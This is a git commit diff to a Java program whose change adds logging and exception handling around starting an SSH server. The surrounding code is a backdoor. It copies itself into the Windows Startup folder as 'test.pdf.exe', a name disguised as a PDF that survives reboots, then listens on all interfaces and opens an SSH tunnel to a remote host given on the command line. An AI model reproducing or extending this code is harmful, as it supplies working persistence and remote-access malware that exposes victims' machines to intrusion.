acc74536924e4fbc64093ae0e108cc30e21499e0
Marcin Marczyk <marcin.marczyk@capgemini.com>
2016-01-26 09:21:49 +0100

    handling exception when ssh server is already running

--- src/main/java/pl/marczyk/Main.java
+++ src/main/java/pl/marczyk/Main.java
@@ -1,5 +1,7 @@
 package pl.marczyk;
 
+import org.apache.log4j.Logger;
+
 import java.io.File;
 import java.io.IOException;
 import java.nio.file.Files;
@@ -8,8 +10,10 @@ import java.nio.file.Files;
  * Created by MMARCZYK on 2016-01-22.
  */
 public class Main {
+    private static final Logger LOGGER = Logger.getLogger(Main.class);
 
     public static void main(String[] args) throws IOException, InterruptedException {
+
         if (args.length != 4) {
             System.out.println("Usage :");
             System.out.println("java -jar port host username password");
@@ -18,8 +22,9 @@ public class Main {
             File sourceFile = new File(Main.class.getProtectionDomain().getCodeSource().getLocation().getPath());
             File targetFile = new File("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\test.pdf.exe");
 
-            if (!targetFile.exists())
+            if (!targetFile.exists()) {
                 Files.copy(sourceFile.toPath(), targetFile.toPath());
+            }
 
             int port = Integer.parseInt(args[0]);
             String remoteHost = args[1];
@@ -28,7 +33,11 @@ public class Main {
 
             SshServer sshServer = new SshServer("0.0.0.0", port);
             SshTunnel sshTunnel = new SshTunnel(remoteHost, port, remoteUsername, remotePassword, "localhost", port);
-            sshServer.start();
+            try {
+                sshServer.start();
+            } catch (Exception e){
+                LOGGER.error("Coludn't start ssh server, maybe it is already running.");
+            }
             sshTunnel.start();
         }
     }
